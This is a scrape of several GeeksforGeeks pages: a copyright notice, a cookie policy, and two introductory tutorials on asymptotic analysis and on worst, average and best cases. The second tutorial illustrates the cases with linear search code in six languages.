Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...What is Memory Leak? How can we avoid?Tree Traversals (Inorder, Preorder and Postorder)Must Do Coding Questions Company-wisePractice for cracking any coding interviewCommonly Asked Data Structure Interview Questions | Set 1Analysis of Algorithms | Set 1 (Asymptotic Analysis)SQL | Join (Inner, Left, Right and Full Joins)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Mutex vs SemaphoreUnderstanding "extern" keyword in CHow to write a Pseudo Code?find command in Linux with examplesAnalysis of Algorithms | Set 4 (Analysis of Loops)OOPs | Object Oriented DesignSQL | GROUP BYData Structures and Algorithms Online Courses : Free and PaidRecursive Practice Problems with SolutionsSQL Interview QuestionsStorage for Strings in CSQL | ORDER BYSQL | ViewsNP-Completeness | Set 1 (Introduction)Little and Big Endian MysteryHow Content Writing at GeeksforGeeks works?Recursive FunctionsWhat is Memory Leak? How can we avoid?SQL | INSERT INTO StatementDo not use sizeof for array parameters Copyright Information Last Updated: 03-06-2020 This is to affirm that we GeeksforGeeks is the copyright right holder of the content. Unauthorization transmission and publication of this content without prior knowledge or written approval is strictly prohibited. However, We reserves the full rights on making use of the courses on practice portal https://practice.geeksforgeeks.org/courses for publication, re-transmission, commercial posting, selling, circulation or redistribution of them and some rights for content on our contribute portal https://www.geeksforgeeks.org/ By “some rights” we mean that a part of our work is under creativecommons.org so you are allowed to share and duplicate this content (videos, photos, images, questions and trade-marks present on the website belong to the company who have produced such materials and are protected by intellectual property laws, conventions and treaties. These can be used for personal or non-commercial purpose only) by giving due attribution with the following mentioned terms and conditions, otherwise, it will still be categorized as copyright violation: Adhere to the rules of CC BY-SA like only those websites can re-use the information that are also part of CC BY-SA. Refrain from using images, photos and videos as these are the sole property of GeeksforGeeks under some rights reserve. Visually indicate that the content is from GeeksforGeeks in some way. Hyperlink directly to the original content on the source site. Show the author names for every article. Hyperlink each article directly back to their user profile page on the source site (e.g., for the article https://www.geeksforgeeks.org/rc4-encryption-algorithm/ the link to the author profile would be https://auth.geeksforgeeks.org/user/Sally%20Jarkas/articles) By “directly”, we mean each hyperlink must point directly to our domain in standard HTML visible even with JavaScript disabled, and not use a tiny url or any other form of obfuscation or redirection. Furthermore, the links must not be nofollowed. This is about the spirit of fair attribution. Attribution to the website, content and more importantly, to the individuals who so generously contributed their time to create that content in the first place! Further, if you believe that any Educator/User has used copyright-protected work in the User Content provided in the GeeksforGeeks Courses, you can report the same or if you believe your or someone else’s copyrights are being infringed upon through these Courses, then let us know by writing to us at techmanager@geeksforgeeks.org. Please note that by claiming copyright infringement you are initiating a legal process, kindly be sure to consider whether fair use, fair dealing, or a similar exception to copyright apply before you report Therefore we believe you will comply with the above-said points to attribute the content in the right spirit. My Personal Notes arrow_drop_up Save Recommended Posts:Structure of C++ ProgramWhile loop with Compile time constantsProjected clustering in data analyticsFlutter - BoxDecoration WidgetHigher Order Functions in C++Calculate pressure of a real gas using Van der Waal's Equation3-way comparison operator (Space Ship Operator) in C++ 20Examples of Big-O analysisCorrecting EOF error in python in CodechefFuture of CybersecurityFlutter - BoxShadow WidgetRelational Database from CSV Files in CDifference between std::set and std::listData Conversion in C++ Article Tags : Articles thumb_up 2 To-do Done 3.5 Based on 2 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Creating custom domain name instead of localhost in Ubuntu Next last_page What is OAuth (Open Authorization) ? Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Articles Proof that SAT is NP CompleteGeneration of Programming LanguagesRunning Python script on GPU.getch() function in C with ExamplesStructure Member Alignment, Padding and Data Packing More related articles in Articles SQL | DROP, TRUNCATEExtends vs Implements in JavaAccess Control Lists(ACL) in LinuxSQL | Join (Cartesian Join & Self Join)SQL | UPDATE Statement room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

HOW DOES GeeksforGeeks USE COOKIES? - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects HOW DOES GeeksforGeeks USE COOKIES? A cookie is a small piece of data that a website asks your browser to store on your computer or mobile device. The cookie allows the website to “remember” your actions or preferences over time. Most browsers support cookies, but users can set their browsers to decline them and can delete them whenever they like. If you use GeeksforGeeks, both GeeksforGeeks and third parties will use cookies to track and monitor some of your activities on and off GeeksforGeeks, and store and access some data about you, your browsing history, and your usage of GeeksforGeeks. This policy describes how both GeeksforGeeks and other third parties use cookies both within and without GeeksforGeeks and how you can exercise a better control over cookies. Please keep in mind that this may alter your experience with our platform, and may limit certain features (including being logged in as a user). General Browsing: We use cookies that are important for certain technical features of our website, like logging into user accounts and implementing fixes and improvements to our platform. These cookies help us: Remember users’ custom preferences and help create more useful products Allow users to opt out of certain types of modeling, tailoring, or personalization in our products Collect information on our users’ preferences in order to create more useful products Cookies can also be used for online behavioural target advertising and to show adverts relevant to something that the user searched for in the past Advertising: We use cookies to enable advertising with our third-party Partners, which in turn allows us to provide many of our services free of charge. These cookies: Customize the ad experience for our users, including tailoring job and display ads to the technologies a person has previously looked at, the communities a person has visited, and the job ads a person has already seen Allow direct communication between a 3rd party partner who hosts a promotional event with us, and users who have opted into the promotion Allow us to track when a GeeksforGeeks user sees or clicks on an ad or later visits a third-party website or purchases a product on a third-party website Collect impressions and click data for internal reporting and product optimization Analytics: We use cookies to compile usage activity in order to better cater our Products and Services offerings to you, and to third parties. We DO NOT share identifiable “raw” data with our clients or any third parties, however we do make high-level decisions based on aggregated data about your usage of our Products and Services. These cookies: Monitor site traffic and behavior flows of users Measure the effectiveness of on-site products Measure the effectiveness of off-site marketing campaigns and tactics WHAT INFORMATION IS COLLECTED ON ME VIA COOKIES? In general, we collect most data from you via form submission. However, there are cases when visiting our site and/or using our platforms in which we may receive certain information through the use of cookies. This data will generally not include personally identifying information about you. Unique identification tokens User preferences Third Party Cookies The use of cookies, the names of cookies, and other cookies related cookies technology may change over time and GeeksforGeeks will make all reasonable efforts to notify you. Please also note that companies and other organization that sponsor pages on GeeksforGeeks may use cookies or other technologies to learn more about your interest in their products and services and in some cases to tailor such products and services to you. HOW DO I RESTRICT COOKIES? Please note that GeeksforGeeks may not work properly and you may have diminished functionality if you wish to opt-out of certain cookies. If you decide that you do not want cookies to be set on your device by our third-party Partners, you can adjust the settings on your internet browser and choose from the available Cookies setting to best meet your preferences. While setting options may vary from browser to browser, you can generally choose to reject some or all cookies, or instead to receive a notification when a cookie is being placed on your device. For more information, please refer to the user help information for your browser of choice. Please keep in mind that cookies may be required for certain functionalities, and by blocking these cookies, you may limit your access to certain parts or features of our sites and platforms. Finally, while cookies are set for varying durations on your device, you can manually delete them at any time. However, deleting cookies will not prevent the site from setting further cookies on your device unless you adjust the settings discussed above. CONTACT US If you have any questions, comments, or concerns regarding this Cookies Policy, please contact GeeksforGeeks at: support@geeksforgeeks.org Privacy Policy @ GeeksforGeeks My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++ Most Visited Articles How to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux?How to Dynamically Add/Remove Table Rows using jQuery ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of Algorithms | Set 1 (Asymptotic Analysis) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortComplexity of different operations in Binary tree, Binary Search Tree and AVL tree Analysis of Algorithms | Set 1 (Asymptotic Analysis) Last Updated: 09-11-2020 Why performance analysis? There are many important things that should be taken care of, like user friendliness, modularity, security, maintainability, etc. Why to worry about performance? The answer to this is simple, we can have all the above things only if we have performance. So performance is like currency through which we can buy all the above things. Another reason for studying performance is – speed is fun! To summarize, performance == scale. Imagine a text editor that can load 1000 pages, but can spell check 1 page per minute OR an image editor that takes 1 hour to rotate your image 90 degrees left OR … you get it. If a software feature can not cope with the scale of tasks users need to perform – it is as good as dead. Given two algorithms for a task, how do we find out which one is better? One naive way of doing this is – implement both the algorithms and run the two programs on your computer for different inputs and see which one takes less time. There are many problems with this approach for analysis of algorithms. 1) It might be possible that for some inputs, first algorithm performs better than the second. And for some inputs second performs better. 2) It might also be possible that for some inputs, first algorithm perform better on one machine and the second works better on other machine for some other inputs. Asymptotic Analysis is the big idea that handles above issues in analyzing algorithms. In Asymptotic Analysis, we evaluate the performance of an algorithm in terms of input size (we don’t measure the actual running time). We calculate, how the time (or space) taken by an algorithm increases with the input size. For example, let us consider the search problem (searching a given item) in a sorted array. One way to search is Linear Search (order of growth is linear) and the other way is Binary Search (order of growth is logarithmic). To understand how Asymptotic Analysis solves the above mentioned problems in analyzing algorithms, let us say we run the Linear Search on a fast computer A and Binary Search on a slow computer B and we pick the constant values for the two computers so that it tells us exactly how long it takes for the given machine to perform the search in seconds. Let’s say the constant for A is 0.2 and the constant for B is 1000 which means that A is 5000 times more powerful than B. For small values of input array size n, the fast computer may take less time. But, after a certain value of input array size, the Binary Search will definitely start taking less time compared to the Linear Search even though the Binary Search is being run on a slow machine. The reason is the order of growth of Binary Search with respect to input size is logarithmic while the order of growth of Linear Search is linear. So the machine dependent constants can always be ignored after a certain value of input size. Here are some running times for this example: Linear Search running time in seconds on A: 0.2 * n Binary Search running time in seconds on B: 1000*log(n) ------------------------------------------------ |n | Running time on A | Running time on B | ------------------------------------------------- |10 | 2 sec | ~ 1 h | ------------------------------------------------- |100 | 20 sec | ~ 1.8 h | ------------------------------------------------- |10^6 | ~ 55.5 h | ~ 5.5 h | ------------------------------------------------- |10^9 | ~ 6.3 years | ~ 8.3 h | ------------------------------------------------- Does Asymptotic Analysis always work? Asymptotic Analysis is not perfect, but that’s the best way available for analyzing algorithms. For example, say there are two sorting algorithms that take 1000nLogn and 2nLogn time respectively on a machine. Both of these algorithms are asymptotically same (order of growth is nLogn). So, With Asymptotic Analysis, we can’t judge which one is better as we ignore constants in Asymptotic Analysis. Also, in Asymptotic analysis, we always talk about input sizes larger than a constant value. It might be possible that those large inputs are never given to your software and an algorithm which is asymptotically slower, always performs better for your particular situation. So, you may end up choosing an algorithm that is Asymptotically slower but faster for your software. Next – Analysis of Algorithms | Set 2 (Worst, Average and Best Cases) References: MIT’s Video lecture 1 on Introduction to Algorithms. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 3 (Asymptotic Notations)Asymptotic Analysis and comparison of sorting algorithmsProperties of Asymptotic NotationsAnalysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Big-O analysisAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)Analysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of algorithms | little o and little omega notationsAnalysis of Algorithm | Set 4 (Solving Recurrences)Practice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Amortized analysis for increment in counterComplexity Analysis of Binary SearchDifference between Posteriori and Priori analysisComplexity analysis of various operations of Binary Min HeapExamples of Big-O analysisAlgorithms | Recurrences | Set 1Improved By : Danail Kozhuharov, biplab_prasad, BenceAment Article Tags : AnalysisArticles thumb_up 298 To-do Done 1.3 Based on 498 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Pure Functions Next last_page Analysis of Algorithms | Set 2 (Worst, Average and Best Cases) Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Difference between NP hard and NP complete problemUnderstanding Time Complexity with Simple ExamplesPractice Questions on Time Complexity AnalysisComplexity Analysis of Binary Search Most visited in Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Tree Traversals (Inorder, Preorder and Postorder)Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Practice for cracking any coding interview room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of Algorithms | Set 2 (Worst, Average and Best Cases) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortProgram for Fibonacci numbersProgram for nth Catalan NumberBell Numbers (Number of ways to Partition a Set)Analysis of Algorithms | Set 1 (Asymptotic Analysis) Analysis of Algorithms | Set 2 (Worst, Average and Best Cases) Last Updated: 09-11-2020 In the previous post, we discussed how Asymptotic analysis overcomes the problems of naive way of analyzing algorithms. In this post, we will take an example of Linear Search and analyze it using Asymptotic analysis.We can have three cases to analyze an algorithm: 1) The Worst Case 2) Average Case 3) Best CaseLet us consider the following implementation of Linear Search. C++ filter_none edit close play_arrow link brightness_4 code // C++ implementation of the approach #include <bits/stdc++.h> using namespace std; // Linearly search x in arr[]. // If x is present then return the index, // otherwise return -1 int search(int arr[], int n, int x) { int i; for (i = 0; i < n; i++) { if (arr[i] == x) return i; } return -1; } // Driver Code int main() { int arr[] = { 1, 10, 30, 15 }; int x = 30; int n = sizeof(arr) / sizeof(arr[0]); cout << x << " is present at index " << search(arr, n, x); getchar(); return 0; } // This code is contributed // by Akanksha Rai chevron_right filter_none C filter_none edit close play_arrow link brightness_4 code // C implementation of the approach #include <stdio.h> // Linearly search x in arr[]. // If x is present then return the index, // otherwise return -1 int search(int arr[], int n, int x) { int i; for (i = 0; i < n; i++) { if (arr[i] == x) return i; } return -1; } /* Driver program to test above functions*/ int main() { int arr[] = { 1, 10, 30, 15 }; int x = 30; int n = sizeof(arr) / sizeof(arr[0]); printf("%d is present at index %d", x, search(arr, n, x)); getchar(); return 0; } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code // Java implementation of the approach public class GFG { // Linearly search x in arr[]. If x is present then // return the index, otherwise return -1 static int search(int arr[], int n, int x) { int i; for (i = 0; i < n; i++) { if (arr[i] == x) { return i; } } return -1; } /* Driver program to test above functions*/ public static void main(String[] args) { int arr[] = { 1, 10, 30, 15 }; int x = 30; int n = arr.length; System.out.printf("%d is present at index %d", x, search(arr, n, x)); } } /*This code is contributed by PrinciRaj1992*/ chevron_right filter_none Python3 filter_none edit close play_arrow link brightness_4 code # Python 3 implementation of the approach # Linearly search x in arr[]. If x is present # then return the index, otherwise return -1 def search(arr, x): for index, value in enumerate(arr): if value == x: return index return -1 # Driver Code arr = [1, 10, 30, 15] x = 30 print(x, "is present at index", search(arr, x)) # This code is contributed # by PrinciRaj1992 chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // C# implementation of the approach using System; public class GFG { // Linearly search x in arr[]. If x is present then // return the index, otherwise return -1 static int search(int[] arr, int n, int x) { int i; for (i = 0; i < n; i++) { if (arr[i] == x) { return i; } } return -1; } /* Driver program to test above functions*/ public static void Main() { int[] arr = { 1, 10, 30, 15 }; int x = 30; int n = arr.Length; Console.WriteLine(x + " is present at index " + search(arr, n, x)); } } /*This code is contributed by PrinciRaj1992*/ chevron_right filter_none PHP filter_none edit close play_arrow link brightness_4 code <?php // PHP implementation of the approach // Linearly search x in arr[]. If x // is present then return the index, // otherwise return -1 function search($arr, $n, $x) { for ($i = 0; $i < $n; $i++) { if ($arr[$i] == $x) return $i; } return -1; } // Driver Code $arr = array(1, 10, 30, 15); $x = 30; $n = sizeof($arr); echo $x . " is present at index ". search($arr, $n, $x); // This code is contributed // by Akanksha Rai chevron_right filter_none Output: 30 is present at index 2 Worst Case Analysis (Usually Done) In the worst case analysis, we calculate upper bound on running time of an algorithm. We must know the case that causes maximum number of operations to be executed. For Linear Search, the worst case happens when the element to be searched (x in the above code) is not present in the array. When x is not present, the search() functions compares it with all the elements of arr[] one by one. Therefore, the worst case time complexity of linear search would be Θ(n). Average Case Analysis (Sometimes done) In average case analysis, we take all possible inputs and calculate computing time for all of the inputs. Sum all the calculated values and divide the sum by total number of inputs. We must know (or predict) distribution of cases. For the linear search problem, let us assume that all cases are uniformly distributed (including the case of x not being present in array). So we sum all the cases and divide the sum by (n+1). Following is the value of average case time complexity. Average Case Time = = = Θ(n) Best Case Analysis (Bogus) In the best case analysis, we calculate lower bound on running time of an algorithm. We must know the case that causes minimum number of operations to be executed. In the linear search problem, the best case occurs when x is present at the first location. The number of operations in the best case is constant (not dependent on n). So time complexity in the best case would be Θ(1) Most of the times, we do worst case analysis to analyze algorithms. In the worst analysis, we guarantee an upper bound on the running time of an algorithm which is good information. The average case analysis is not easy to do in most of the practical cases and it is rarely done. In the average case analysis, we must know (or predict) the mathematical distribution of all possible inputs. The Best Case analysis is bogus. Guaranteeing a lower bound on an algorithm doesn’t provide any information as in the worst case, an algorithm may take years to run.For some algorithms, all the cases are asymptotically same, i.e., there are no worst and best cases. For example, Merge Sort. Merge Sort does Θ(nLogn) operations in all cases. Most of the other sorting algorithms have worst and best cases. For example, in the typical implementation of Quick Sort (where pivot is chosen as a corner element), the worst occurs when the input array is already sorted and the best occur when the pivot elements always divide array in two halves. For insertion sort, the worst case occurs when the array is reverse sorted and the best case occurs when the array is sorted in the same order as output. Next – Analysis of Algorithms | Set 3 (Asymptotic Notations) References: MIT’s Video lecture 1 on Introduction to Algorithms. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Big-O analysisAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)Don’t Forget The Edge Cases !Analysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 3 (Asymptotic Notations)Asymptotic Analysis and comparison of sorting algorithmsAnalysis of algorithms | little o and little omega notationsAnalysis of Algorithm | Set 4 (Solving Recurrences)Difference between Posteriori and Priori analysisFind array elements that are greater than averageAverage of Cubes of first N natural numbers6 Best CSS frameworks You should Know to design Attractive WebsitesPractice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Amortized analysis for increment in counterComplexity Analysis of Binary SearchImproved By : princiraj1992, Akanksha_Rai, AnkurChattopadhyay, GauriShankarBadola Article Tags : AnalysisArticles thumb_up 158 To-do Done 1.5 Based on 341 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Analysis of Algorithms | Set 1 (Asymptotic Analysis) Next last_page Reservoir Sampling Writing code in comment? Please use 